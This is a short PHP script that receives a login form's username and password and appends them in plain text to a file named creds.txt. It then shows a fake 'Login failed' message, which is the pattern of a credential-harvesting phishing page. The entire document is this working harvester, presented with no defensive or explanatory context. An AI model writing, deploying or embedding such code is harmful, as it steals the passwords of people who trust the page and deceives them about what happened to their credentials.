<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $user = $_POST['username'];
  $pass = $_POST['password'];

  // Save to file
  $file = fopen("creds.txt", "a");
  fwrite($file, "Username: " . $user . " | Password: " . $pass . "\n");
  fclose($file);

  // Redirect or show message
  echo "<h2>Login failed. Please try again.</h2>";
}
?>
